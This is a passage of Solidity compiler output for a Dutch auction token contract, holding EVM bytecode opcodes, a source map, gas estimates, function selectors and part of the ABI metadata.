0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1117 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x1122 DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x1130 DUP2 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1147 JUMPI PUSH2 0x1146 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1163 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1013 JUMP JUMPDEST PUSH2 0x1170 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xF32 JUMP JUMPDEST PUSH2 0x117D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1190 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x119B DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x11B3 JUMPI PUSH2 0x11B2 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA PUSH5 0x986EFE334F CREATE2 DUP4 PUSH28 0x986DB8A789595EF8A676806085E4AC809B5C5513312F64736F6C6343 STOP ADDMOD ISZERO STOP CALLER LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDE PREVRANDAO RETURNDATASIZE 0xBD 0x1F OR LT SWAP13 0xD4 DUP12 0xCA POP GT MUL 0xB1 MSIZE 0xE7 PUSH25 0x24C1B5A3660B39A879017BA4A2B964736F6C63430008150033 ","sourceMap":"302:11511:7:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;11711:100;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;10503:97;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;7009:836;;;;;;;;;;;;;:::i;:::-;;10389:108;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;10948:154;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4803:992;;;:::i;:::-;;11429:147;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;889:45;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;;;;;;:::i;:::-;;;;;;;;3969:778;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;10822:120;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;11108:162;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;11276:147;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;5801:488;;;;;;;;;;;;;:::i;:::-;;10722:94;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;7851:1981;;;;;;;;;;;;;:::i;:::-;;10270:113;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;10606:110;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;6295:708;;;;;;;;;;;;;:::i;:::-;;9838:392;;;;;;;;;;;;;:::i;:::-;;11711:100;11759:12;11790:14;;;;;;;;;;;11783:21;;11711:100;:::o;10503:97::-;10556:6;10581:12;;10574:19;;10503:97;:::o;7009:836::-;7051:6;7046:793;7067:15;;7063:1;:19;7046:793;;;7151:1;7124:11;:14;7136:1;7124:14;;;;;;;;;;;:24;;;:28;:96;;;;;7196:11;:14;7208:1;7196:14;;;;;;;;;;;:24;;;7172:21;:48;7124:96;:125;;;;;7248:1;7224:21;:25;7124:125;7103:726;;;7310:17;7330:11;:14;7342:1;7330:14;;;;;;;;;;;:24;;;7310:44;;7454:16;7484:11;:14;7496:1;7484:14;;;;;;;;;;;:28;;;;;;;;;;;;7476:63;;7547:9;7476:85;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7453:108;;;7648:166;7681:11;:14;7693:1;7681:14;;;;;;;;;;;:28;;;;;;;;;;;;7731:11;:14;7743:1;7731:14;;;;;;;;;;;:34;;;7787:9;7648:166;;;;;;;;:::i;:::-;;;;;;;;7264:565;;7103:726;7084:3;;;;;:::i;:::-;;;;7046:793;;;;7009:836::o;10389:108::-;10452:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;10478:12:::1;10471:19;;10389:108:::0;:::o;10948:154::-;11041:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;11067:11:::1;:19;11079:6;11067:19;;;;;;;;;;;:28;;;11060:35;;10948:154:::0;;;:::o;4803:992::-;2157:7;2143:21;;:10;:21;;;2139:58;;2173:24;;;;;;;;;;;;;;2139:58;2353:14:::1;;;;;;;;;;;2329:38;;;;;;;;:::i;:::-;;:20;:38:::0;::::1;;;;;;;:::i;:::-;;::::0;2325:87:::1;;2388:24;;;;;;;;;;;;;;2325:87;4930:1:::2;4918:9;:13;4910:46;;;;;;;;;;;;:::i;:::-;;;;;;;;;4966:11;:9;:11::i;:::-;660:4;5013:9;;4995:15;:27;;;;:::i;:::-;:42;4987:65;;;;;;;;;;;;:::i;:::-;;;;;;;;;5091:1;5070:18;;:22;5062:62;;;;;;;;;;;;:::i;:::-;;;;;;;;;5203:24;5230:11;:28;5242:15;;5230:28;;;;;;;;;;;5203:55;;5289:15;;5268:9;:18;;:36;;;;5340:10;5314:9;:23;;;:36;;;;;;;;;;;;;;;;;;5381:9;5360;:18;;:30;;;;5420:4;5400:9;:17;;;:24;;;;;;;;;;;;;;;;;;5466:1;5434:9;:29;;:33;;;;5499:1;5477:9;:19;;:23;;;;5541:9;5510:11;:28;5522:15;;5510:28;;;;;;;;;;;:40;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5565:125;5593:9;:18;;;5625:9;:23;;;;;;;;;;;;5662:9;:18;;;5565:125;;;;;;;;:::i;:::-;;;;;;;;5700:15;;:17;;;;;;;;;:::i;:::-;;;;;;5727:11;:9;:11::i;:::-;4860:935;4803:992::o:0;11429:147::-;11491:7;11517;;;;;;;;;;;:17;;;11535:11;:19;11547:6;11535:19;;;;;;;;;;;:33;;;;;;;;;;;;11517:52;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;11510:59;;11429:147;;;:::o;889:45::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;3969:778::-;4106:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;2567:14:::1;;;;;;;;;;;2546:35;;;;;;;;:::i;:::-;;:17;:35;;;;;;;;:::i;:::-;;::::0;2542:69:::1;;2590:21;;;;;;;;;;;;;;2542:69;4142:17:::2;4125:14;;:34;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;4191:20;4169:19;:42;;;;4236:13;4221:12;:28;;;;4281:10;4259:12;:33;;;;4323:20;4302:18;:41;;;;4365:15;4353:9;:27;;;;4461:19;;4490:4;4446:50;;;;;:::i;:::-;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;::::0;::::2;;;;;;4436:7;;:60;;;;;;;;;;;;;;;;;;4537:7;;;;;;;;;;;4506:20;;:39;;;;;;;;;;;;;;;;;;4560:143;4591:9;;4614:20;;;;;;;;;;;4648:19;;4681:12;;4560:143;;;;;;;;;:::i;:::-;;;;;;;;4720:20;;;;;;;;;;;4713:27;;3969:778:::0;;;;:::o;10822:120::-;10888:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;10914:21:::1;10907:28;;10822:120:::0;:::o;11108:162::-;11198:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;11224:11:::1;:19;11236:6;11224:19;;;;;;;;;;;:39;;;11217:46;;11108:162:::0;;;:::o;11276:147::-;11361:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;11387:11:::1;:19;11399:6;11387:19;;;;;;;;;;;:29;;;11380:36;;11276:147:::0;;;:::o;5801:488::-;5853:12;;;;;;;;;;;5848:435;;6000:12;;5975:2;5962:9;;5944:15;:27;;;;:::i;:::-;5943:34;;;;:::i;:::-;5936:77;;;;:::i;:::-;5910:10;5903:110;;;;:::i;:::-;5876:12;:137;;;;6044:1;6028:12;;:17;;:57;;;;6072:12;6049;;:36;;6028:57;6024:123;;;6123:12;6101;:35;;;;6024:123;6161:111;6217:9;;6199:15;:27;;;;:::i;:::-;6249:12;;6161:111;;;;;;;:::i;:::-;;;;;;;;5848:435;5801:488::o;10722:94::-;10776:7;10802;10795:14;;10722:94;:::o;7851:1981::-;7889:20;:18;:20::i;:::-;7919;7942:19;;7919:42;;7976:6;7971:1628;7992:15;;7988:1;:19;7971:1628;;;8166:12;;8132:11;:14;8144:1;8132:14;;;;;;;;;;;:23;;;:47;;;;:::i;:::-;8116:12;:63;8095:1310;;8323:12;;8269:11;:14;8281:1;8269:14;;;;;;;;;;;:23;;;:67;;;;:::i;:::-;8212:11;:14;8224:1;8212:14;;;;;;;;;;;:34;;:124;;;;8404:12;;8370:11;:14;8382:1;8370:14;;;;;;;;;;;:23;;;:47;;;;:::i;:::-;8354:63;;;;;:::i;:::-;;;8462:1;8435:11;:14;8447:1;8435:14;;;;;;;;;;;:24;;:28;;;;8095:1310;;;8695:1;8680:12;:16;:98;;;;;8765:12;;8731:11;:14;8743:1;8731:14;;;;;;;;;;;:23;;;:47;;;;:::i;:::-;8716:12;:62;8680:98;8659:746;;;8848:12;8811:11;:14;8823:1;8811:14;;;;;;;;;;;:34;;:49;;;;8893:1;8878:16;;9070:12;;9005:11;:14;9017:1;9005:14;;;;;;;;;;;:34;;;:78;;;;:::i;:::-;8959:11;:14;8971:1;8959:14;;;;;;;;;;;:23;;;:124;;;;:::i;:::-;8912:11;:14;8924:1;8912:14;;;;;;;;;;;:24;;:171;;;;8659:746;;;9225:1;9209:12;:17;9205:200;;9321:1;9284:11;:14;9296:1;9284:14;;;;;;;;;;;:34;;:38;;;;9367:11;:14;9379:1;9367:14;;;;;;;;;;;:23;;;9340:11;:14;9352:1;9340:14;;;;;;;;;;;:24;;:50;;;;9205:200;8659:746;8095:1310;9423:165;9452:11;:14;9464:1;9452:14;;;;;;;;;;;:28;;;;;;;;;;;;9498:11;:14;9510:1;9498:14;;;;;;;;;;;:34;;;9550:11;:14;9562:1;9550:14;;;;;;;;;;;:24;;;9423:165;;;;;;;;:::i;:::-;;;;;;;;8009:3;;;;;:::i;:::-;;;;7971:1628;;;;9628:1;9613:12;:16;9609:217;;;9666:12;9645:18;:33;;;;9609:217;;;9726:20;9709:14;;:37;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;9781:1;9760:18;:22;;;;9811:4;9796:12;;:19;;;;;;;;;;;;;;;;;;9609:217;7879:1953;7851:1981::o;10270:113::-;10331:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;10357:19:::1;;10350:26;;10270:113:::0;:::o;10606:110::-;10668:7;1973;1959:21;;:10;:21;;;1955:59;;1989:25;;;;;;;;;;;;;;1955:59;10694:15:::1;;10687:22;;10606:110:::0;:::o;6295:708::-;6339:6;6334:663;6355:15;;6351:1;:19;6334:663;;;6432:1;6395:11;:14;6407:1;6395:14;;;;;;;;;;;:34;;;:38;6391:596;;;6453:7;;;;;;;;;;;:15;;;6490:11;:14;6502:1;6490:14;;;;;;;;;;;:28;;;;;;;;;;;;6577:8;6540:11;:14;6552:1;6540:14;;;;;;;;;;;:34;;;:45;;;;:::i;:::-;6453:150;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;6621:7;;;;;;;;;;;:20;;;6671:4;6698:11;:14;6710:1;6698:14;;;;;;;;;;;:28;;;;;;;;;;;;6785:8;6748:11;:14;6760:1;6748:14;;;;;;;;;;;:34;;;:45;;;;:::i;:::-;6621:190;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;6834:138;6870:11;:14;6882:1;6870:14;;;;;;;;;;;:28;;;;;;;;;;;;6920:11;:14;6932:1;6920:14;;;;;;;;;;;:34;;;6834:138;;;;;;;:::i;:::-;;;;;;;;6391:596;6372:3;;;;;:::i;:::-;;;;6334:663;;;;6295:708::o;9838:392::-;9894:20;9877:14;;:37;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;9924:11;:9;:11::i;:::-;9945;:9;:11::i;:::-;9966:12;:10;:12::i;:::-;10013:1;9992:18;;:22;9988:100;;;10030:7;;;;;;;;;;;:12;;;10051:4;10058:18;;10030:47;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;9988:100;10102:121;10131:15;;10160:18;;10192:21;10102:121;;;;;;;;:::i;:::-;;;;;;;;9838:392::o;-1:-1:-1:-;;;;;;;;:::o;7:180:10:-;55:77;52:1;45:88;152:4;149:1;142:15;176:4;173:1;166:15;193:122;283:1;276:5;273:12;263:46;;289:18;;:::i;:::-;263:46;193:122;:::o;321:145::-;375:7;404:5;393:16;;410:50;454:5;410:50;:::i;:::-;321:145;;;:::o;472:::-;537:9;570:41;605:5;570:41;:::i;:::-;557:54;;472:145;;;:::o;623:161::-;725:52;771:5;725:52;:::i;:::-;720:3;713:65;623:161;;:::o;790:252::-;898:4;936:2;925:9;921:18;913:26;;949:86;1032:1;1021:9;1017:17;1008:6;949:86;:::i;:::-;790:252;;;;:::o;1048:76::-;1084:7;1113:5;1102:16;;1048:76;;;:::o;1130:115::-;1215:23;1232:5;1215:23;:::i;:::-;1210:3;1203:36;1130:115;;:::o;1251:218::-;1342:4;1380:2;1369:9;1365:18;1357:26;;1393:69;1459:1;1448:9;1444:17;1435:6;1393:69;:::i;:::-;1251:218;;;;:::o;1475:77::-;1512:7;1541:5;1530:16;;1475:77;;;:::o;1558:118::-;1645:24;1663:5;1645:24;:::i;:::-;1640:3;1633:37;1558:118;;:::o;1682:222::-;1775:4;1813:2;1802:9;1798:18;1790:26;;1826:71;1894:1;1883:9;1879:17;1870:6;1826:71;:::i;:::-;1682:222;;;;:::o;1991:117::-;2100:1;2097;2090:12;2237:122;2310:24;2328:5;2310:24;:::i;:::-;2303:5;2300:35;2290:63;;2349:1;2346;2339:12;2290:63;2237:122;:::o;2365:139::-;2411:5;2449:6;2436:20;2427:29;;2465:33;2492:5;2465:33;:::i;:::-;2365:139;;;;:::o;2510:329::-;2569:6;2618:2;2606:9;2597:7;2593:23;2589:32;2586:119;;;2624:79;;:::i;:::-;2586:119;2744:1;2769:53;2814:7;2805:6;2794:9;2790:22;2769:53;:::i;:::-;2759:63;;2715:117;2510:329;;;;:::o;2845:126::-;2882:7;2922:42;2915:5;2911:54;2900:65;;2845:126;;;:::o;2977:96::-;3014:7;3043:24;3061:5;3043:24;:::i;:::-;3032:35;;2977:96;;;:::o;3079:118::-;3166:24;3184:5;3166:24;:::i;:::-;3161:3;3154:37;3079:118;;:::o;3203:90::-;3237:7;3280:5;3273:13;3266:21;3255:32;;3203:90;;;:::o;3299:109::-;3380:21;3395:5;3380:21;:::i;:::-;3375:3;3368:34;3299:109;;:::o;3414:763::-;3641:4;3679:3;3668:9;3664:19;3656:27;;3693:71;3761:1;3750:9;3746:17;3737:6;3693:71;:::i;:::-;3774:72;3842:2;3831:9;3827:18;3818:6;3774:72;:::i;:::-;3856;3924:2;3913:9;3909:18;3900:6;3856:72;:::i;:::-;3938;4006:2;3995:9;3991:18;3982:6;3938:72;:::i;:::-;4020:73;4088:3;4077:9;4073:19;4064:6;4020:73;:::i;:::-;4103:67;4165:3;4154:9;4150:19;4141:6;4103:67;:::i;:::-;3414:763;;;;;;;;;:::o;4183:474::-;4251:6;4259;4308:2;4296:9;4287:7;4283:23;4279:32;4276:119;;;4314:79;;:::i;:::-;4276:119;4434:1;4459:53;4504:7;4495:6;4484:9;4480:22;4459:53;:::i;:::-;4449:63;;4405:117;4561:2;4587:53;4632:7;4623:6;4612:9;4608:22;4587:53;:::i;:::-;4577:63;;4532:118;4183:474;;;;;:::o;4663:222::-;4756:4;4794:2;4783:9;4779:18;4771:26;;4807:71;4875:1;4864:9;4860:17;4851:6;4807:71;:::i;:::-;4663:222;;;;:::o;4891:147::-;4992:11;5029:3;5014:18;;4891:147;;;;:::o;5044:114::-;;:::o;5164:398::-;5323:3;5344:83;5425:1;5420:3;5344:83;:::i;:::-;5337:90;;5436:93;5525:3;5436:93;:::i;:::-;5554:1;5549:3;5545:11;5538:18;;5164:398;;;:::o;5568:379::-;5752:3;5774:147;5917:3;5774:147;:::i;:::-;5767:154;;5938:3;5931:10;;5568:379;;;:::o;5953:442::-;6102:4;6140:2;6129:9;6125:18;6117:26;;6153:71;6221:1;6210:9;6206:17;6197:6;6153:71;:::i;:::-;6234:72;6302:2;6291:9;6287:18;6278:6;6234:72;:::i;:::-;6316;6384:2;6373:9;6369:18;6360:6;6316:72;:::i;:::-;5953:442;;;;;;:::o;6401:180::-;6449:77;6446:1;6439:88;6546:4;6543:1;6536:15;6570:4;6567:1;6560:15;6587:233;6626:3;6649:24;6667:5;6649:24;:::i;:::-;6640:33;;6695:66;6688:5;6685:77;6682:103;;6765:18;;:::i;:::-;6682:103;6812:1;6805:5;6801:13;6794:20;;6587:233;;;:::o;6826:169::-;6910:11;6944:6;6939:3;6932:19;6984:4;6979:3;6975:14;6960:29;;6826:169;;;;:::o;7001:170::-;7141:22;7137:1;7129:6;7125:14;7118:46;7001:170;:::o;7177:366::-;7319:3;7340:67;7404:2;7399:3;7340:67;:::i;:::-;7333:74;;7416:93;7505:3;7416:93;:::i;:::-;7534:2;7529:3;7525:12;7518:19;;7177:366;;;:::o;7549:419::-;7715:4;7753:2;7742:9;7738:18;7730:26;;7802:9;7796:4;7792:20;7788:1;7777:9;7773:17;7766:47;7830:131;7956:4;7830:131;:::i;:::-;7822:139;;7549:419;;;:::o;7974:194::-;8014:4;8034:20;8052:1;8034:20;:::i;:::-;8029:25;;8068:20;8086:1;8068:20;:::i;:::-;8063:25;;8112:1;8109;8105:9;8097:17;;8136:1;8130:4;8127:11;8124:37;;;8141:18;;:::i;:::-;8124:37;7974:194;;;;:::o;8174:160::-;8314:12;8310:1;8302:6;8298:14;8291:36;8174:160;:::o;8340:366::-;8482:3;8503:67;8567:2;8562:3;8503:67;:::i;:::-;8496:74;;8579:93;8668:3;8579:93;:::i;:::-;8697:2;8692:3;8688:12;8681:19;;8340:366;;;:::o;8712:419::-;8878:4;8916:2;8905:9;8901:18;8893:26;;8965:9;8959:4;8955:20;8951:1;8940:9;8936:17;8929:47;8993:131;9119:4;8993:131;:::i;:::-;8985:139;;8712:419;;;:::o;9137:177::-;9277:29;9273:1;9265:6;9261:14;9254:53;9137:177;:::o;9320:366::-;9462:3;9483:67;9547:2;9542:3;9483:67;:::i;:::-;9476:74;;9559:93;9648:3;9559:93;:::i;:::-;9677:2;9672:3;9668:12;9661:19;;9320:366;;;:::o;9692:419::-;9858:4;9896:2;9885:9;9881:18;9873:26;;9945:9;9939:4;9935:20;9931:1;9920:9;9916:17;9909:47;9973:131;10099:4;9973:131;:::i;:::-;9965:139;;9692:419;;;:::o;10117:442::-;10266:4;10304:2;10293:9;10289:18;10281:26;;10317:71;10385:1;10374:9;10370:17;10361:6;10317:71;:::i;:::-;10398:72;10466:2;10455:9;10451:18;10442:6;10398:72;:::i;:::-;10480;10548:2;10537:9;10533:18;10524:6;10480:72;:::i;:::-;10117:442;;;;;;:::o;10565:143::-;10622:5;10653:6;10647:13;10638:22;;10669:33;10696:5;10669:33;:::i;:::-;10565:143;;;;:::o;10714:351::-;10784:6;10833:2;10821:9;10812:7;10808:23;10804:32;10801:119;;;10839:79;;:::i;:::-;10801:119;10959:1;10984:64;11040:7;11031:6;11020:9;11016:22;10984:64;:::i;:::-;10974:74;;10930:128;10714:351;;;;:::o;11071:332::-;11192:4;11230:2;11219:9;11215:18;11207:26;;11243:71;11311:1;11300:9;11296:17;11287:6;11243:71;:::i;:::-;11324:72;11392:2;11381:9;11377:18;11368:6;11324:72;:::i;:::-;11071:332;;;;;:::o;11409:553::-;11586:4;11624:3;11613:9;11609:19;11601:27;;11638:71;11706:1;11695:9;11691:17;11682:6;11638:71;:::i;:::-;11719:72;11787:2;11776:9;11772:18;11763:6;11719:72;:::i;:::-;11801;11869:2;11858:9;11854:18;11845:6;11801:72;:::i;:::-;11883;11951:2;11940:9;11936:18;11927:6;11883:72;:::i;:::-;11409:553;;;;;;;:::o;11968:180::-;12016:77;12013:1;12006:88;12113:4;12110:1;12103:15;12137:4;12134:1;12127:15;12154:185;12194:1;12211:20;12229:1;12211:20;:::i;:::-;12206:25;;12245:20;12263:1;12245:20;:::i;:::-;12240:25;;12284:1;12274:35;;12289:18;;:::i;:::-;12274:35;12331:1;12328;12324:9;12319:14;;12154:185;;;;:::o;12345:556::-;12384:7;12407:19;12424:1;12407:19;:::i;:::-;12402:24;;12440:19;12457:1;12440:19;:::i;:::-;12435:24;;12494:1;12491;12487:9;12516:29;12533:11;12516:29;:::i;:::-;12505:40;;12603:66;12600:1;12597:73;12593:1;12590;12586:9;12582:89;12579:115;;;12674:18;;:::i;:::-;12579:115;12844:1;12835:7;12830:16;12827:1;12824:23;12804:1;12797:9;12777:84;12754:140;;12874:18;;:::i;:::-;12754:140;12392:509;12345:556;;;;:::o;12907:372::-;12946:4;12966:19;12983:1;12966:19;:::i;:::-;12961:24;;12999:19;13016:1;12999:19;:::i;:::-;12994:24;;13042:1;13039;13035:9;13027:17;;13236:1;13230:4;13226:12;13222:1;13219;13215:9;13211:28;13194:1;13188:4;13184:12;13179:1;13176;13172:9;13165:17;13161:36;13145:104;13142:130;;;13252:18;;:::i;:::-;13142:130;12907:372;;;;:::o;13285:332::-;13406:4;13444:2;13433:9;13429:18;13421:26;;13457:71;13525:1;13514:9;13510:17;13501:6;13457:71;:::i;:::-;13538:72;13606:2;13595:9;13591:18;13582:6;13538:72;:::i;:::-;13285:332;;;;;:::o;13623:410::-;13663:7;13686:20;13704:1;13686:20;:::i;:::-;13681:25;;13720:20;13738:1;13720:20;:::i;:::-;13715:25;;13775:1;13772;13768:9;13797:30;13815:11;13797:30;:::i;:::-;13786:41;;13976:1;13967:7;13963:15;13960:1;13957:22;13937:1;13930:9;13910:83;13887:139;;14006:18;;:::i;:::-;13887:139;13671:362;13623:410;;;;:::o;14039:332::-;14160:4;14198:2;14187:9;14183:18;14175:26;;14211:71;14279:1;14268:9;14264:17;14255:6;14211:71;:::i;:::-;14292:72;14360:2;14349:9;14345:18;14336:6;14292:72;:::i;:::-;14039:332;;;;;:::o;14377:116::-;14447:21;14462:5;14447:21;:::i;:::-;14440:5;14437:32;14427:60;;14483:1;14480;14473:12;14427:60;14377:116;:::o;14499:137::-;14553:5;14584:6;14578:13;14569:22;;14600:30;14624:5;14600:30;:::i;:::-;14499:137;;;;:::o;14642:345::-;14709:6;14758:2;14746:9;14737:7;14733:23;14729:32;14726:119;;;14764:79;;:::i;:::-;14726:119;14884:1;14909:61;14962:7;14953:6;14942:9;14938:22;14909:61;:::i;:::-;14899:71;;14855:125;14642:345;;;;:::o;14993:442::-;15142:4;15180:2;15169:9;15165:18;15157:26;;15193:71;15261:1;15250:9;15246:17;15237:6;15193:71;:::i;:::-;15274:72;15342:2;15331:9;15327:18;15318:6;15274:72;:::i;:::-;15356;15424:2;15413:9;15409:18;15400:6;15356:72;:::i;:::-;14993:442;;;;;;:::o;15441:::-;15590:4;15628:2;15617:9;15613:18;15605:26;;15641:71;15709:1;15698:9;15694:17;15685:6;15641:71;:::i;:::-;15722:72;15790:2;15779:9;15775:18;15766:6;15722:72;:::i;:::-;15804;15872:2;15861:9;15857:18;15848:6;15804:72;:::i;:::-;15441:442;;;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"3467000","executionCost":"infinite","totalCost":"infinite"},"external":{"":"197","addBidder()":"infinite","balanceOfBidder(uint256)":"infinite","biddersList(uint256)":"infinite","calculate()":"infinite","endAuction()":"infinite","getAuctionState()":"2592","refundETH()":"infinite","retrieveBidderAlgos(uint256)":"infinite","retrieveBidderBidValue(uint256)":"infinite","retrieveContractBalance()":"infinite","retrieveContractOwner()":"infinite","retrieveCurrentPrice()":"2483","retrieveRefund(uint256)":"infinite","retrieveReservePrice()":"infinite","retrieveTotalAlgos()":"infinite","retrieveTotalBidder()":"infinite","sendTokens()":"infinite","startAuction(uint256,uint256)":"infinite","updateCurrentPrice()":"infinite"}},"methodIdentifiers":{"addBidder()":"1f8cdb04","balanceOfBidder(uint256)":"2d21a3ed","biddersList(uint256)":"3fa8578d","calculate()":"ca77ab65","endAuction()":"fe67a54b","getAuctionState()":"08bfc300","refundETH()":"12210e8a","retrieveBidderAlgos(uint256)":"83634e1c","retrieveBidderBidValue(uint256)":"1f732088","retrieveContractBalance()":"7ded653f","retrieveContractOwner()":"ac5ece6d","retrieveCurrentPrice()":"0b324808","retrieveRefund(uint256)":"a45b4abb","retrieveReservePrice()":"14df33ac","retrieveTotalAlgos()":"df385306","retrieveTotalBidder()":"e4655bca","sendTokens()":"e47112bd","startAuction(uint256,uint256)":"4fee13fc","updateCurrentPrice()":"aa9d9bd6"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_reservePrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_startPrice\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Dutch_Auction__IsOwner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"Dutch_Auction__NotOpen\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"Dutch_Auction__NotOwner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"Dutch_Auction__Open\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"bidderAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"TokensPurchased\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"refundValue\",\"type\":\"uint256\"}],\"name\":\"RefundEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bidderID\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"walletAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bidvalue\",\"type\":\"uint256\"}],\"name\":\"addBidderEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"bidderAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"TokensPurchased\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"refundValue\",\"type\":\"uint256\"}],\"name\":\"calculateEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalBidders\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"burntERC20\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalETHEarned\",\"type\":\"uint256\"}],\"name\":\"endAuctionEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"bidderAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSent\",\"type\":\"uint256\"}],\"name\":\"sendTokenEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"startTime\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"ERC20Address\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalAlgosAvailable\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"changePerMin\",\"type\":\"uint256\"}],\"name\":\"